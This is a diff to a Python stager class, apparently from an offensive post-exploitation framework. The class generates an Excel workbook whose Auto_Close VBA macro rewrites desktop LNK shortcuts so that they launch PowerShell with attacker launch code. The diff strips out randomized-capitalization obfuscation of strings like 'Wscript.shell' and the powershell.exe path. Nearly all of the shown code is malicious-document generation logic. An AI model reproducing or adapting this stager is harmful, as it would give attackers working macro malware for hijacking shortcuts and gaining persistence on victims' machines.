@@ -283,9 +283,7 @@ class Stager(object):
             # build out the macro - first take all strings that would normally go into the macro and place them into random cells, which we then reference in our macro
             macro = "Sub Auto_Close()\n"
 
-            active_sheet.write(
-                input_row, input_col, helpers.randomize_capitalization("Wscript.shell")
-            )
+            active_sheet.write(input_row, input_col, "Wscript.shell")
             macro += (
                 "Set "
                 + shell_var
@@ -298,7 +296,7 @@ class Stager(object):
             active_sheet.write(
                 input_row,
                 input_col,
-                helpers.randomize_capitalization("Scripting.FileSystemObject"),
+                "Scripting.FileSystemObject",
             )
             macro += (
                 "Set "
@@ -309,9 +307,7 @@ class Stager(object):
             )
             input_col = input_col + random.randint(1, 4)
 
-            active_sheet.write(
-                input_row, input_col, helpers.randomize_capitalization("desktop")
-            )
+            active_sheet.write(input_row, input_col, "desktop")
             macro += (
                 "Set "
                 + folder_var
@@ -378,11 +374,6 @@ class Stager(object):
 
             # part of the macro that actually modifies the LNK files on the desktop, sets icon location for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
             macro += lnk_var + ".IconLocation = " + lnk_var + ".targetpath\n"
-            launch_string1 = helpers.randomize_capitalization(launch_string1)
-            launch_string2 = helpers.randomize_capitalization(launch_string2)
-            launch_string3 = helpers.randomize_capitalization(launch_string3)
-            launch_string4 = helpers.randomize_capitalization(launch_string4)
-            launch_string5 = helpers.randomize_capitalization(launch_string5)
             launch_string_sum = (
                 launch_string2
                 + "'%Y%m%d'"
@@ -416,9 +407,7 @@ class Stager(object):
             active_sheet.write(
                 input_row,
                 input_col,
-                helpers.randomize_capitalization(
-                    ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-                ),
+                ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
             )
             macro += (
                 lnk_var
